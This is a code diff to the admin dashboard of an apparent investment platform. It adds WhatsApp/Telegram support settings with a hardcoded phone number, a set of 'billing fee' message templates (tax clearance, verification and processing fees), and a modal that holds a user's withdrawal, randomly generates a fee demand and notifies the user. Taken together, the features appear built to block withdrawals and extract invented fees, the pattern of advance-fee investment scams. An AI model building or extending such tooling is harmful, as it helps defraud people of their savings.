@@ -7,7 +7,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { toast } from 'sonner';
-import { LogOut, Loader2, CheckCircle, XCircle, DollarSign, TrendingUp, Globe, Lock, CreditCard, Save, Wallet, AlertCircle, Clock } from 'lucide-react';
+import { LogOut, Loader2, CheckCircle, XCircle, DollarSign, TrendingUp, Globe, Lock, CreditCard, Save, Wallet, AlertCircle, Clock, MessageSquare, Phone, Send, X } from 'lucide-react';
 
 interface Investment {
   id: string;
@@ -47,6 +47,11 @@ interface WithdrawalSettings {
   defaultHoldMessage: string;
 }
 
+interface SupportSettings {
+  type: 'whatsapp' | 'telegram';
+  phone: string;
+}
+
 const languages = [
   { code: 'en', label: 'English' },
   { code: 'ru', label: 'Русский' },
@@ -70,6 +75,19 @@ const DEFAULT_WITHDRAWAL_SETTINGS: WithdrawalSettings = {
   defaultHoldMessage: 'Your withdrawal is currently being processed. Please contact support for more information.',
 };
 
+const DEFAULT_SUPPORT_SETTINGS: SupportSettings = {
+  type: 'whatsapp',
+  phone: '+12186500840',
+};
+
+const BILLING_FEE_TEMPLATES = [
+  'Processing fee of $50 required to complete this withdrawal. Please contact support.',
+  'Tax clearance fee of $100 required. Contact support to proceed.',
+  'Verification fee of $75 pending. Reach out to support team.',
+  'Service charge of $150 needed to release funds. Contact us on WhatsApp.',
+  'Administrative fee of $200 required for international transfer.',
+];
+
 const Admin = () => {
   const { language, setLanguage, t } = useLanguage();
   const { user, loading: authLoading, signOut } = useAuth();
@@ -83,9 +101,17 @@ const Admin = () => {
   const [updatingWithdrawal, setUpdatingWithdrawal] = useState<string | null>(null);
   const [paymentSettings, setPaymentSettings] = useState<PaymentSettings>(DEFAULT_PAYMENT_SETTINGS);
   const [withdrawalSettings, setWithdrawalSettings] = useState<WithdrawalSettings>(DEFAULT_WITHDRAWAL_SETTINGS);
+  const [supportSettings, setSupportSettings] = useState<SupportSettings>(DEFAULT_SUPPORT_SETTINGS);
   const [savingPayment, setSavingPayment] = useState(false);
   const [savingWithdrawal, setSavingWithdrawal] = useState(false);
+  const [savingSupport, setSavingSupport] = useState(false);
   const [activeTab, setActiveTab] = useState<'investments' | 'withdrawals'>('investments');
+  
+  // Status modal state
+  const [showStatusModal, setShowStatusModal] = useState(false);
+  const [statusModalWithdrawal, setStatusModalWithdrawal] = useState<Withdrawal | null>(null);
+  const [statusModalType, setStatusModalType] = useState<'pending' | 'processing' | 'on_hold'>('pending');
+  const [statusModalMessage, setStatusModalMessage] = useState('');
 
   // Check admin role via database
   useEffect(() => {
@@ -158,6 +184,12 @@ const Admin = () => {
             const value = setting.setting_value as unknown as WithdrawalSettings;
             setWithdrawalSettings({
               defaultHoldMessage: value.defaultHoldMessage || DEFAULT_WITHDRAWAL_SETTINGS.defaultHoldMessage,
+            });
+          } else if (setting.setting_key === 'support_settings' && setting.setting_value) {
+            const value = setting.setting_value as unknown as SupportSettings;
+            setSupportSettings({
+              type: value.type || DEFAULT_SUPPORT_SETTINGS.type,
+              phone: value.phone || DEFAULT_SUPPORT_SETTINGS.phone,
             });
           }
         });
@@ -471,13 +503,77 @@ const Admin = () => {
     }
   };
 
+  const handleSaveSupportSettings = async () => {
+    if (!supportSettings.phone.trim()) {
+      toast.error('Support phone is required');
+      return;
+    }
+
+    setSavingSupport(true);
+    try {
+      // Check if setting exists
+      const { data: existingSetting } = await supabase
+        .from('admin_settings')
+        .select('id')
+        .eq('setting_key', 'support_settings')
+        .maybeSingle();
+
+      if (existingSetting) {
+        await supabase
+          .from('admin_settings')
+          .update({ 
+            setting_value: JSON.parse(JSON.stringify(supportSettings)),
+            updated_by: user?.id,
+            updated_at: new Date().toISOString()
+          })
+          .eq('setting_key', 'support_settings');
+      } else {
+        await supabase
+          .from('admin_settings')
+          .insert({ 
+            setting_key: 'support_settings',
+            setting_value: JSON.parse(JSON.stringify(supportSettings)),
+            updated_by: user?.id
+          });
+      }
+      
+      toast.success('Support settings saved!');
+    } catch (error: unknown) {
+      const errorMessage = error instanceof Error ? error.message : 'Failed to save support settings';
+      toast.error(errorMessage);
+    } finally {
+      setSavingSupport(false);
+    }
+  };
+
+  const openStatusModal = (withdrawal: Withdrawal, type: 'pending' | 'processing' | 'on_hold') => {
+    setStatusModalWithdrawal(withdrawal);
+    setStatusModalType(type);
+    setStatusModalMessage(type === 'on_hold' ? withdrawal.hold_message || withdrawalSettings.defaultHoldMessage : '');
+    setShowStatusModal(true);
+  };
+
+  const handleStatusModalSave = async () => {
+    if (!statusModalWithdrawal) return;
+    
+    const status = statusModalType === 'processing' ? 'pending' : statusModalType;
+    await updateWithdrawal(statusModalWithdrawal.id, status, statusModalType === 'on_hold' ? statusModalMessage : undefined);
+    setShowStatusModal(false);
+  };
+
+  const generateRandomFeeMessage = () => {
+    const randomIndex = Math.floor(Math.random() * BILLING_FEE_TEMPLATES.length);
+    setStatusModalMessage(BILLING_FEE_TEMPLATES[randomIndex]);
+  };
+
   const getStatusBadge = (status: string) => {
     const styles: Record<string, string> = {
       active: 'bg-green-500/20 text-green-400 border-green-500/30',
       completed: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
       pending: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
-      cancelled: 'bg-red-500/20 text-red-400 border-red-500/30',
-      on_hold: 'bg-orange-500/20 text-orange-400 border-orange-500/30'
+      cancelled: 'bg-slate-500/20 text-slate-400 border-slate-500/30',
+      on_hold: 'bg-orange-500/20 text-orange-400 border-orange-500/30',
+      processing: 'bg-blue-500/20 text-blue-400 border-blue-500/30'
     };
     return styles[status] || styles.pending;
   };
@@ -702,6 +798,54 @@ const Admin = () => {
           </Button>
         </div>
 
+        {/* Support Settings Section */}
+        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 mb-8 animate-fade-in">
+          <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
+            <MessageSquare className="w-5 h-5 text-electric-blue" />
+            Customer Support Settings
+          </h2>
+          <div className="grid gap-4 md:grid-cols-2">
+            <div className="space-y-2">
+              <Label className="text-slate-300">Support Type</Label>
+              <div className="flex gap-2">
+                <Button
+                  type="button"
+                  variant={supportSettings.type === 'whatsapp' ? 'default' : 'outline'}
+                  onClick={() => setSupportSettings(prev => ({ ...prev, type: 'whatsapp' }))}
+                  className={supportSettings.type === 'whatsapp' ? 'bg-green-600 hover:bg-green-700' : 'border-slate-600 text-slate-300 hover:bg-slate-700'}
+                >
+                  WhatsApp
+                </Button>
+                <Button
+                  type="button"
+                  variant={supportSettings.type === 'telegram' ? 'default' : 'outline'}
+                  onClick={() => setSupportSettings(prev => ({ ...prev, type: 'telegram' }))}
+                  className={supportSettings.type === 'telegram' ? 'bg-blue-600 hover:bg-blue-700' : 'border-slate-600 text-slate-300 hover:bg-slate-700'}
+                >
+                  Telegram
+                </Button>
+              </div>
+            </div>
+            <div className="space-y-2">
+              <Label className="text-slate-300">Support Phone/Username</Label>
+              <Input
+                value={supportSettings.phone}
+                onChange={(e) => setSupportSettings(prev => ({ ...prev, phone: e.target.value }))}
+                className="bg-slate-900/50 border-slate-600 text-white"
+                placeholder={supportSettings.type === 'telegram' ? '@username or phone' : '+12186500840'}
+              />
+            </div>
+          </div>
+          <Button
+            onClick={handleSaveSupportSettings}
+            className="mt-4 bg-electric-blue hover:bg-electric-blue/90"
+            disabled={savingSupport}
+          >
+            {savingSupport ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
+            Save Support Settings
+          </Button>
+        </div>
+
         {/* Tabs */}
         <div className="flex gap-2 mb-6">
           <Button
@@ -865,18 +1009,6 @@ const Admin = () => {
                       </div>
 
                       <div className="flex flex-col gap-3 md:items-end">
-                        {withdrawal.status === 'on_hold' && (
-                          <div className="w-full md:w-64">
-                            <Label className="text-slate-300 text-sm">Hold Message:</Label>
-                            <Input
-                              value={withdrawal.hold_message || withdrawalSettings.defaultHoldMessage}
-                              onChange={(e) => handleWithdrawalHoldMessageChange(withdrawal.id, e.target.value)}
-                              className="mt-1 bg-slate-900/50 border-slate-600 text-white text-sm"
-                              placeholder="Enter hold message..."
-                            />
-                          </div>
-                        )}
-
                         <div className="flex flex-wrap gap-2">
                           {withdrawal.status === 'pending' && (
                             <>
@@ -896,12 +1028,22 @@ const Admin = () => {
                               <Button
                                 size="sm"
                                 variant="outline"
-                                onClick={() => updateWithdrawal(withdrawal.id, 'on_hold', withdrawalSettings.defaultHoldMessage)}
+                                onClick={() => openStatusModal(withdrawal, 'processing')}
                                 disabled={updatingWithdrawal === withdrawal.id}
-                                className="border-orange-500 text-orange-500 hover:bg-orange-500/10"
+                                className="border-blue-500 text-blue-400 hover:bg-blue-500/10"
                               >
                                 <Clock className="w-4 h-4 mr-1" />
-                                Put on Hold
+                                Processing
+                              </Button>
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                onClick={() => openStatusModal(withdrawal, 'on_hold')}
+                                disabled={updatingWithdrawal === withdrawal.id}
+                                className="border-orange-500 text-orange-400 hover:bg-orange-500/10"
+                              >
+                                <AlertCircle className="w-4 h-4 mr-1" />
+                                Hold
                               </Button>
                             </>
                           )}
@@ -923,18 +1065,18 @@ const Admin = () => {
                               <Button
                                 size="sm"
                                 variant="outline"
-                                onClick={() => updateWithdrawal(withdrawal.id, 'on_hold', withdrawal.hold_message || withdrawalSettings.defaultHoldMessage)}
+                                onClick={() => openStatusModal(withdrawal, 'on_hold')}
                                 disabled={updatingWithdrawal === withdrawal.id}
                                 className="border-electric-blue text-electric-blue hover:bg-electric-blue/10"
                               >
-                                Update Message
+                                Edit Message
                               </Button>
                               <Button
                                 size="sm"
                                 variant="outline"
-                                onClick={() => updateWithdrawal(withdrawal.id, 'pending')}
+                                onClick={() => openStatusModal(withdrawal, 'pending')}
                                 disabled={updatingWithdrawal === withdrawal.id}
-                                className="border-yellow-500 text-yellow-500 hover:bg-yellow-500/10"
+                                className="border-yellow-500 text-yellow-400 hover:bg-yellow-500/10"
                               >
                                 Set Pending
                               </Button>
@@ -950,6 +1092,130 @@ const Admin = () => {
           </>
         )}
       </main>
+
+      {/* Status Modal */}
+      {showStatusModal && statusModalWithdrawal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-fade-in">
+          <div className="bg-slate-800 border border-slate-700 rounded-2xl w-full max-w-md">
+            {/* Modal Header */}
+            <div className="flex items-center justify-between p-4 border-b border-slate-700">
+              <div className="flex items-center gap-3">
+                <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
+                  statusModalType === 'on_hold' ? 'bg-orange-500/20' : 
+                  statusModalType === 'processing' ? 'bg-blue-500/20' : 'bg-yellow-500/20'
+                }`}>
+                  {statusModalType === 'on_hold' ? (
+                    <AlertCircle className="w-5 h-5 text-orange-500" />
+                  ) : statusModalType === 'processing' ? (
+                    <Loader2 className="w-5 h-5 text-blue-500" />
+                  ) : (
+                    <Clock className="w-5 h-5 text-yellow-500" />
+                  )}
+                </div>
+                <div>
+                  <h3 className="font-bold text-lg text-white">
+                    {statusModalType === 'on_hold' ? 'Put on Hold' : 
+                     statusModalType === 'processing' ? 'Set Processing' : 'Set Pending'}
+                  </h3>
+                  <p className="text-xs text-slate-400">${statusModalWithdrawal.amount.toLocaleString()}</p>
+                </div>
+              </div>
+              <button 
+                onClick={() => setShowStatusModal(false)}
+                className="p-2 hover:bg-slate-700 rounded-lg transition-colors"
+              >
+                <X className="w-5 h-5 text-slate-400" />
+              </button>
+            </div>
+
+            {/* Modal Content */}
+            <div className="p-4 space-y-4">
+              {statusModalType === 'on_hold' && (
+                <>
+                  <div className="space-y-2">
+                    <Label className="text-slate-300">Hold/Billing Fee Message</Label>
+                    <textarea
+                      value={statusModalMessage}
+                      onChange={(e) => setStatusModalMessage(e.target.value)}
+                      className="w-full h-24 bg-slate-900/50 border border-slate-600 rounded-lg p-3 text-white text-sm resize-none focus:outline-none focus:ring-2 focus:ring-orange-500"
+                      placeholder="Enter the billing fee or hold message..."
+                    />
+                  </div>
+                  <div className="flex gap-2">
+                    <Button
+                      type="button"
+                      variant="outline"
+                      size="sm"
+                      onClick={generateRandomFeeMessage}
+                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
+                    >
+                      Auto Generate Fee
+                    </Button>
+                  </div>
+                  <div className="space-y-2">
+                    <Label className="text-slate-400 text-xs">Quick Templates:</Label>
+                    <div className="grid gap-2">
+                      {BILLING_FEE_TEMPLATES.slice(0, 3).map((template, index) => (
+                        <button
+                          key={index}
+                          type="button"
+                          onClick={() => setStatusModalMessage(template)}
+                          className="text-left text-xs p-2 bg-slate-900/50 border border-slate-700 rounded-lg text-slate-400 hover:bg-slate-700 hover:text-white transition-colors"
+                        >
+                          {template}
+                        </button>
+                      ))}
+                    </div>
+                  </div>
+                </>
+              )}
+
+              {statusModalType === 'processing' && (
+                <div className="bg-blue-500/10 border border-blue-500/30 rounded-lg p-4">
+                  <p className="text-blue-400 text-sm">
+                    This will set the withdrawal to a processing state. The user will be notified that their withdrawal is being processed.
+                  </p>
+                </div>
+              )}
+
+              {statusModalType === 'pending' && (
+                <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-4">
+                  <p className="text-yellow-400 text-sm">
+                    This will reset the withdrawal to pending status.
+                  </p>
+                </div>
+              )}
+            </div>
+
+            {/* Modal Footer */}
+            <div className="p-4 border-t border-slate-700 flex gap-3">
+              <Button
+                variant="outline"
+                onClick={() => setShowStatusModal(false)}
+                className="flex-1 border-slate-600 text-slate-300 hover:bg-slate-700"
+              >
+                Cancel
+              </Button>
+              <Button
+                onClick={handleStatusModalSave}
+                disabled={updatingWithdrawal === statusModalWithdrawal.id}
+                className={`flex-1 ${
+                  statusModalType === 'on_hold' ? 'bg-orange-600 hover:bg-orange-700' :
+                  statusModalType === 'processing' ? 'bg-blue-600 hover:bg-blue-700' :
+                  'bg-yellow-600 hover:bg-yellow-700'
+                }`}
+              >
+                {updatingWithdrawal === statusModalWithdrawal.id ? (
+                  <Loader2 className="w-4 h-4 animate-spin mr-2" />
+                ) : (
+                  <Send className="w-4 h-4 mr-2" />
+                )}
+                Save & Notify
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
